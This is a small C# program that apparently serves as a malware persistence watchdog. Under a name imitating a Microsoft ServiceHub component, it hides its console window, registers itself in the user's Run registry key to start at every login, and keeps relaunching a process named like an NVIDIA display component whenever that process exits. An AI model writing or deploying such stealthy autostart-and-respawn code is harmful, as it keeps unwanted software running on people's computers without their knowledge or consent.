using System;
using System.Drawing;
using System.Reflection;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Linq;
using System.Diagnostics;

namespace ServiceHub.Host.NodeRuntime
{
    class Program
    {
        private static Process _sisterProcess;

        private static void setAutoStart(bool enabled)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (enabled)
            {
                rk.SetValue(AppDomain.CurrentDomain.FriendlyName, Assembly.GetExecutingAssembly().Location);
            }
            else
            {
                rk.DeleteValue(AppDomain.CurrentDomain.FriendlyName, false);
            }
        }

        private static void hideWindow(bool b)
        {
            var consoleHwnd = NativeMethods.GetConsoleWindow();

            if (b)
            {
                NativeMethods.ShowWindow(consoleHwnd, Const.SW_HIDE);
            }
            else
            {
                NativeMethods.ShowWindow(consoleHwnd, Const.SW_SHOW);
            }
        }

        static void Main(string[] args)
        {
            hideWindow(true);
            setAutoStart(true);

            while (true)
            {
                _sisterProcess = Process.GetProcessesByName("nvspdisplay64").FirstOrDefault();
                if (_sisterProcess != null)
                {
                    _sisterProcess.StartInfo.FileName = _sisterProcess.MainModule.FileName;
                    break;
                }

                Thread.Sleep(500);
            }

            while (true)
            {
                if (_sisterProcess.HasExited)
                    _sisterProcess.Start();

                Thread.Sleep(1500);
            }
        }
    }
}
